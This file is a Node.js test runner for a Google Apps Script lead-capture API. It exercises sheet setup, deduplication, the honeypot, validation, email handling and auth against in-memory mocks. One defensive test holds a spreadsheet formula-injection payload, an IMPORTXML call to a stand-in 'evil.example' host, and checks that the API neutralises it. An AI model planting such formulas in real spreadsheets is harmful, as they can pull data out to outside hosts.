/* ============================================================
   BLUEGRID API — LOCAL TEST RUNNER

   Runs the Apps Script modules on Node against in-memory mocks of
   SpreadsheetApp, LockService, PropertiesService, MailApp, Session,
   Utilities, and ContentService.

   Purpose: prove the lead pipeline works before anything is deployed
   to Google, and re-prove it after every code change without needing
   a spreadsheet or credentials.

   Run from this folder:   node localTestRunner.js

   This file is a development tool. It is NOT pasted into the Apps
   Script editor — only the .gs files are.
============================================================ */

const fs = require('fs');

const path = require('path');

const vm = require('vm');

/* ============================================================
   IN-MEMORY SPREADSHEET MOCK
============================================================ */

function createRange(sheet, row, column, numRows, numColumns)
{

    return {

        getValues: function ()
        {

            const out = [];

            for (let r = 0; r < numRows; r += 1)
            {

                const rowValues = [];

                for (let c = 0; c < numColumns; c += 1)
                {

                    rowValues.push(sheet.readCell(row + r, column + c));

                }

                out.push(rowValues);

            }

            return out;

        },

        setValues: function (values)
        {

            values.forEach(function (rowValues, r)
            {

                rowValues.forEach(function (value, c)
                {

                    sheet.writeCell(row + r, column + c, value);

                });

            });

            return this;

        },

        setValue: function (value)
        {

            sheet.writeCell(row, column, value);

            return this;

        },

        setNumberFormat: function () { return this; },

        setFontWeight: function () { return this; },

        setBackground: function () { return this; },

        setFontColor: function () { return this; }

    };

}

function createSheet(name)
{

    const sheet = {

        name: name,

        cells: {},

        frozenRows: 0,

        maxColumns: 30,

        key: function (row, column) { return row + ':' + column; },

        readCell: function (row, column)
        {

            const value = this.cells[this.key(row, column)];

            return (value === undefined) ? '' : value;

        },

        writeCell: function (row, column, value)
        {

            this.cells[this.key(row, column)] = value;

        },

        getName: function () { return this.name; },

        getMaxColumns: function () { return this.maxColumns; },

        getMaxRows: function () { return Math.max(this.getLastRow(), 1000); },

        insertColumnsAfter: function (after, howMany)
        {

            this.maxColumns += howMany;

        },

        getLastRow: function ()
        {

            let last = 0;

            Object.keys(this.cells).forEach(function (cellKey)
            {

                const row = Number(cellKey.split(':')[0]);

                if (row > last) { last = row; }

            });

            return last;

        },

        getRange: function (row, column, numRows, numColumns)
        {

            return createRange(this, row, column, numRows || 1, numColumns || 1);

        },

        appendRow: function (values)
        {

            const row = this.getLastRow() + 1;

            const self = this;

            values.forEach(function (value, index)
            {

                self.writeCell(row, index + 1, value);

            });

        },

        deleteRow: function (rowToDelete)
        {

            const last = this.getLastRow();

            const self = this;

            Object.keys(this.cells).forEach(function (cellKey)
            {

                const row = Number(cellKey.split(':')[0]);

                if (row === rowToDelete) { delete self.cells[cellKey]; }

            });

            for (let row = rowToDelete + 1; row <= last; row += 1)
            {

                for (let column = 1; column <= this.maxColumns; column += 1)
                {

                    const fromKey = this.key(row, column);

                    if (Object.prototype.hasOwnProperty.call(this.cells, fromKey))
                    {

                        this.cells[this.key(row - 1, column)] = this.cells[fromKey];

                        delete this.cells[fromKey];

                    }

                }

            }

        },

        setFrozenRows: function (count) { this.frozenRows = count; },

        getFrozenRows: function () { return this.frozenRows; },

        setColumnWidth: function () { return this; }

    };

    return sheet;

}

function createSpreadsheet()
{

    return {

        sheets: {},

        namedRanges: [],

        getSheetByName: function (name) { return this.sheets[name] || null; },

        insertSheet: function (name)
        {

            this.sheets[name] = createSheet(name);

            return this.sheets[name];

        },

        getRange: function (a1) { return { a1: a1 }; },

        getNamedRanges: function ()
        {

            const self = this;

            return this.namedRanges.map(function (entry)
            {

                return {

                    getName: function () { return entry.name; },

                    remove: function ()
                    {

                        self.namedRanges = self.namedRanges.filter(function (candidate)
                        {

                            return candidate !== entry;

                        });

                    }

                };

            });

        },

        setNamedRange: function (name, range)
        {

            this.namedRanges.push({ name: name, range: range });

        }

    };

}

/* ============================================================
   GOOGLE SERVICE MOCKS
============================================================ */

const spreadsheet = createSpreadsheet();

const sentEmails = [];

let failNextEmail = false;

const sandbox = {

    console: console,

    Date: Date,

    JSON: JSON,

    Math: Math,

    Object: Object,

    Array: Array,

    String: String,

    Number: Number,

    Boolean: Boolean,

    isNaN: isNaN,

    encodeURI: encodeURI,

    SpreadsheetApp: {

        getActiveSpreadsheet: function () { return spreadsheet; },

        openById: function () { return spreadsheet; }

    },

    LockService: {

        getScriptLock: function ()
        {

            return {

                waitLock: function () { return true; },

                releaseLock: function () { return true; }

            };

        }

    },

    PropertiesService: {

        getScriptProperties: function ()
        {

            return {

                getProperty: function (key)
                {

                    return (key === 'MODULE_API_KEY') ? 'test-api-key' : null;

                }

            };

        }

    },

    MailApp: {

        sendEmail: function (optionsOrTo, subject, body)
        {

            if (failNextEmail)
            {

                failNextEmail = false;

                throw new Error('Simulated mail failure');

            }

            if (typeof optionsOrTo === 'string')
            {

                sentEmails.push({ to: optionsOrTo, subject: subject, body: body });

            }
            else
            {

                sentEmails.push(optionsOrTo);

            }

        }

    },

    Session: {

        getScriptTimeZone: function () { return 'America/New_York'; }

    },

    Utilities: {

        formatDate: function (date) { return date.toISOString(); }

    },

    ContentService: {

        MimeType: { JSON: 'application/json' },

        createTextOutput: function (text)
        {

            return {

                content: text,

                setMimeType: function () { return this; },

                getContent: function () { return this.content; }

            };

        }

    }

};

sandbox.globalThis = sandbox;

vm.createContext(sandbox);

/* ============================================================
   LOAD THE .gs MODULES INTO ONE SHARED SCOPE
   (this is how Apps Script itself evaluates a project)
============================================================ */

const moduleFiles = [
    'config.gs',
    'utilities.gs',
    'validation.gs',
    'leads.gs',
    'notifications.gs',
    'routes.gs',
    'Code.gs'
];

moduleFiles.forEach(function (fileName)
{

    const source = fs.readFileSync(path.join(__dirname, fileName), 'utf8');

    try
    {

        vm.runInContext(source, sandbox, { filename: fileName });

    }
    catch (loadError)
    {

        console.error('FAILED TO LOAD ' + fileName + ': ' + loadError.message);

        process.exit(1);

    }

});

/* Function declarations land on the context object automatically, but
   top-level `const` does not — so the constants are re-exported here
   for the assertions below. Apps Script itself has no such split;
   this is purely a Node/vm detail. */

vm.runInContext(
    'globalThis.constants = {'
    + ' SHEET_NAMES: SHEET_NAMES,'
    + ' LEADS_HEADERS: LEADS_HEADERS,'
    + ' ERROR_LOG_HEADERS: ERROR_LOG_HEADERS,'
    + ' ENUM_VALUES: ENUM_VALUES,'
    + ' DEFAULT_NOTIFICATION_EMAIL: DEFAULT_NOTIFICATION_EMAIL'
    + ' };',
    sandbox
);

/* ============================================================
   TEST HARNESS
============================================================ */

let passed = 0;

let failed = 0;

function check(label, condition, detail)
{

    if (condition)
    {

        passed += 1;

        console.log('  PASS  ' + label);

    }
    else
    {

        failed += 1;

        console.log('  FAIL  ' + label + (detail ? '  ->  ' + detail : ''));

    }

}

function parse(response)
{

    return JSON.parse(response.getContent());

}

function basePayload(overrides)
{

    const payload = {

        leadId: 'BG-' + Date.now(),

        submittedAt: new Date().toISOString(),

        fullName: 'Dale Compton',

        phone: '(606) 555-0142',

        email: 'dale.compton@example.com',

        propertyAddress: '1284 Twin Branch Rd, Ashland, KY 41101',

        estimatedAcres: '3.5',

        serviceNeeded: 'Forestry Mulching',

        projectDescription: 'About 3 acres of overgrown brush behind the house.',

        preferredContactMethod: 'Text',

        preferredTime: 'Evening',

        photoCount: 2,

        photoNames: ['backLot1.jpg', 'backLot2.jpg'],

        sourcePage: 'services/forestryMulching.html#estimateForm',

        leadSource: 'website',

        utmSource: '',

        utmMedium: '',

        utmCampaign: '',

        facebookCampaign: '',

        companyWebsite: ''

    };

    Object.keys(overrides || {}).forEach(function (key)
    {

        payload[key] = overrides[key];

    });

    return payload;

}

function leadsSheet()
{

    return sandbox.getOrCreateSheet(sandbox.constants.SHEET_NAMES.leads);

}

function errorLogSheet()
{

    return sandbox.getOrCreateSheet(sandbox.constants.SHEET_NAMES.errorLog);

}

/* ============================================================
   TESTS
============================================================ */

console.log('\nBLUEGRID API — LOCAL TEST RUN\n' + '='.repeat(46) + '\n');

console.log('SETUP');

const setupMessage = sandbox.setupSpreadsheet();

check('setupSpreadsheet runs', typeof setupMessage === 'string');

check('leads sheet created', Boolean(spreadsheet.getSheetByName('leads')));

check('errorLog sheet created', Boolean(spreadsheet.getSheetByName('errorLog')));

check('config sheet created', Boolean(spreadsheet.getSheetByName('config')));

check('dropdowns sheet created', Boolean(spreadsheet.getSheetByName('dropdowns')));

check('dashboardMetrics sheet created', Boolean(spreadsheet.getSheetByName('dashboardMetrics')));

const headerRow = leadsSheet().getRange(1, 1, 1, sandbox.constants.LEADS_HEADERS.length).getValues()[0];

check('leads row 1 = 27 canonical headers',
    headerRow.length === 27 && headerRow.join(',') === sandbox.constants.LEADS_HEADERS.join(','));

const errorHeaderRow = errorLogSheet()
    .getRange(1, 1, 1, sandbox.constants.ERROR_LOG_HEADERS.length).getValues()[0];

check('errorLog row 1 = 5 canonical headers',
    errorHeaderRow.join(',') === 'timestamp,leadId,functionName,errorMessage,stackTrace');

console.log('\nIDEMPOTENCY');

const sheetCountBefore = Object.keys(spreadsheet.sheets).length;

const namedBefore = spreadsheet.namedRanges.length;

const configRowsBefore = spreadsheet.getSheetByName('config').getLastRow();

sandbox.setupSpreadsheet();

sandbox.setupSpreadsheet();

check('re-running setup creates no duplicate sheets',
    Object.keys(spreadsheet.sheets).length === sheetCountBefore,
    'before=' + sheetCountBefore + ' after=' + Object.keys(spreadsheet.sheets).length);

check('re-running setup creates no duplicate named ranges',
    spreadsheet.namedRanges.length === namedBefore,
    'before=' + namedBefore + ' after=' + spreadsheet.namedRanges.length);

check('re-running setup creates no duplicate config rows',
    spreadsheet.getSheetByName('config').getLastRow() === configRowsBefore,
    'before=' + configRowsBefore + ' after=' + spreadsheet.getSheetByName('config').getLastRow());

console.log('\nPING');

const ping = parse(sandbox.doGet({ parameter: { action: 'ping' } }));

check('ping succeeds', ping.success === true);

check('ping reports module', ping.data && ping.data.module === 'forestryModule');

console.log('\nCREATE — HAPPY PATH');

sentEmails.length = 0;

const happyPayload = basePayload();

const created = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(happyPayload) }

}));

check('create succeeds', created.success === true, JSON.stringify(created.error || {}));

check('lead row written to sheet', leadsSheet().getLastRow() === 2);

check('status forced to new', created.data.lead.status === 'new');

check('photoUrls forced to []', Array.isArray(created.data.lead.photoUrls)
    && created.data.lead.photoUrls.length === 0);

check('lastUpdated stamped', Boolean(created.data.lead.lastUpdated));

check('leadId preserved from client', created.data.lead.leadId === happyPayload.leadId);

console.log('\nEMAIL — OWNER ONLY');

check('exactly two emails sent (owner + auto-reply)', sentEmails.length === 2,
    'sent=' + sentEmails.length);

const ownerEmail = sentEmails[0];

check('owner email goes to Bluegridls@gmail.com', ownerEmail.to === 'Bluegridls@gmail.com',
    'to=' + ownerEmail.to);

check('NO cc to Nulo Studio', !ownerEmail.cc);

check('no recipient anywhere is admin@nulostudio.com',
    JSON.stringify(sentEmails).indexOf('admin@nulostudio.com') === -1);

check('replyTo is the customer', ownerEmail.replyTo === happyPayload.email);

check('owner email contains name', ownerEmail.body.indexOf('Dale Compton') !== -1);

check('owner email contains phone', ownerEmail.body.indexOf('(606) 555-0142') !== -1);

check('owner email contains email', ownerEmail.body.indexOf('dale.compton@example.com') !== -1);

check('owner email contains message',
    ownerEmail.body.indexOf('overgrown brush behind the house') !== -1);

check('owner email contains timestamp', ownerEmail.body.indexOf('Submitted  :') !== -1);

check('auto-reply goes to the customer', sentEmails[1].to === happyPayload.email);

console.log('\nDEDUPE');

const replay = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(happyPayload) }

}));

check('replay succeeds', replay.success === true);

check('replay flagged duplicate', replay.data.duplicate === true);

check('replay wrote no second row', leadsSheet().getLastRow() === 2);

console.log('\nHONEYPOT');

sentEmails.length = 0;

const trapped = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        leadId: 'BG-' + (Date.now() + 5),

        companyWebsite: 'http://spam.example'

    })) }

}));

check('honeypot returns fake success', trapped.success === true);

check('honeypot flagged', trapped.data.honeypot === true);

check('honeypot wrote no row', leadsSheet().getLastRow() === 2);

check('honeypot sent no email', sentEmails.length === 0);

console.log('\nVALIDATION');

const rowsBeforeInvalid = leadsSheet().getLastRow();

const invalid = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify({ fullName: '', phone: 'x', email: 'nope' }) }

}));

check('invalid payload rejected', invalid.success === false);

check('error code is VALIDATION_ERROR', invalid.error.code === 'VALIDATION_ERROR');

check('field errors returned', Boolean(invalid.error.fields && invalid.error.fields.fullName));

check('invalid payload wrote no lead row', leadsSheet().getLastRow() === rowsBeforeInvalid);

const badAcres = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        leadId: 'BG-' + (Date.now() + 9),

        estimatedAcres: 'abc'

    })) }

}));

check('non-numeric acres rejected', badAcres.success === false
    && Boolean(badAcres.error.fields.estimatedAcres));

const badEnum = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        leadId: 'BG-' + (Date.now() + 11),

        serviceNeeded: 'Underwater Basket Weaving'

    })) }

}));

check('invalid serviceNeeded enum rejected', badEnum.success === false
    && Boolean(badEnum.error.fields.serviceNeeded));

console.log('\nERROR LOG');

check('validation failure recorded in errorLog', errorLogSheet().getLastRow() > 1);

const loggedRow = errorLogSheet()
    .getRange(errorLogSheet().getLastRow(), 1, 1, 5).getValues()[0];

check('errorLog row has timestamp', Boolean(loggedRow[0]));

check('errorLog row has functionName', Boolean(loggedRow[2]));

check('errorLog row has errorMessage', Boolean(loggedRow[3]));

console.log('\nSHEET IS THE AUDIT TRAIL (email failure must not fail the lead)');

sentEmails.length = 0;

failNextEmail = true;

const rowsBeforeMailFail = leadsSheet().getLastRow();

const errorRowsBeforeMailFail = errorLogSheet().getLastRow();

const mailFailLead = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        leadId: 'BG-' + (Date.now() + 21)

    })) }

}));

check('lead still reported successful when email throws', mailFailLead.success === true);

check('lead row still written when email throws',
    leadsSheet().getLastRow() === rowsBeforeMailFail + 1);

check('email failure recorded in errorLog',
    errorLogSheet().getLastRow() > errorRowsBeforeMailFail);

console.log('\nFORMULA INJECTION');

const injected = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        leadId: 'BG-' + (Date.now() + 31),

        fullName: '=IMPORTXML("http://evil.example","//a")'

    })) }

}));

check('formula-injection payload neutralized',
    injected.success === true && injected.data.lead.fullName.charAt(0) === "'",
    'stored=' + (injected.data.lead && injected.data.lead.fullName));

console.log('\nHEADER SELF-HEAL');

leadsSheet().getRange(1, 3, 1, 1).setValue('customerName');

const healed = parse(sandbox.doGet({

    parameter: { action: 'leads.list', apiKey: 'test-api-key' }

}));

const headersAfterHeal = leadsSheet()
    .getRange(1, 1, 1, sandbox.constants.LEADS_HEADERS.length).getValues()[0];

check('foreign header repaired to canonical', headersAfterHeal[2] === 'fullName');

check('data survived header repair', healed.success === true && healed.data.count > 0);

console.log('\nAUTH');

const unauthorizedList = parse(sandbox.doGet({ parameter: { action: 'leads.list' } }));

check('leads.list without key -> UNAUTHORIZED',
    unauthorizedList.success === false && unauthorizedList.error.code === 'UNAUTHORIZED');

const authorizedList = parse(sandbox.doGet({

    parameter: { action: 'leads.list', apiKey: 'test-api-key' }

}));

check('leads.list with key succeeds', authorizedList.success === true);

check('photoNames parsed back to a real array',
    Array.isArray(authorizedList.data.leads[authorizedList.data.leads.length - 1].photoNames));

console.log('\nUPDATE');

const updated = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({

        leadId: happyPayload.leadId,

        status: 'contacted',

        estimateAmount: '2400'

    }) }

}));

check('update succeeds', updated.success === true, JSON.stringify(updated.error || {}));

check('status changed', updated.data.lead.status === 'contacted');

check('estimateAmount written', updated.data.lead.estimateAmount === '2400');

const badStatus = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({ leadId: happyPayload.leadId, status: 'banana' }) }

}));

check('invalid status rejected', badStatus.success === false
    && badStatus.error.code === 'VALIDATION_ERROR');

const missingLead = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({ leadId: 'BG-0000000000000', status: 'lost' }) }

}));

check('unknown leadId -> NOT_FOUND', missingLead.success === false
    && missingLead.error.code === 'NOT_FOUND');

const unauthorizedUpdate = parse(sandbox.doPost({

    parameter: { action: 'leads.update' },

    postData: { contents: JSON.stringify({ leadId: happyPayload.leadId, status: 'lost' }) }

}));

check('update without key -> UNAUTHORIZED', unauthorizedUpdate.success === false
    && unauthorizedUpdate.error.code === 'UNAUTHORIZED');

console.log('\nUNKNOWN ACTION');

const unknown = parse(sandbox.doGet({ parameter: { action: 'leads.explode' } }));

check('unknown action -> UNKNOWN_ACTION', unknown.success === false
    && unknown.error.code === 'UNKNOWN_ACTION');

console.log('\nBUILT-IN SELF TEST');

const selfTestOutput = sandbox.runSelfTest();

console.log(selfTestOutput.split('\n').map(function (line) { return '        ' + line; }).join('\n'));

check('runSelfTest reports no failures', selfTestOutput.indexOf('FAIL') === -1, selfTestOutput);

/* ============================================================
   SUMMARY
============================================================ */

console.log('\n' + '='.repeat(46));

console.log('  passed: ' + passed + '   failed: ' + failed);

console.log('='.repeat(46) + '\n');

process.exit(failed === 0 ? 0 : 1);
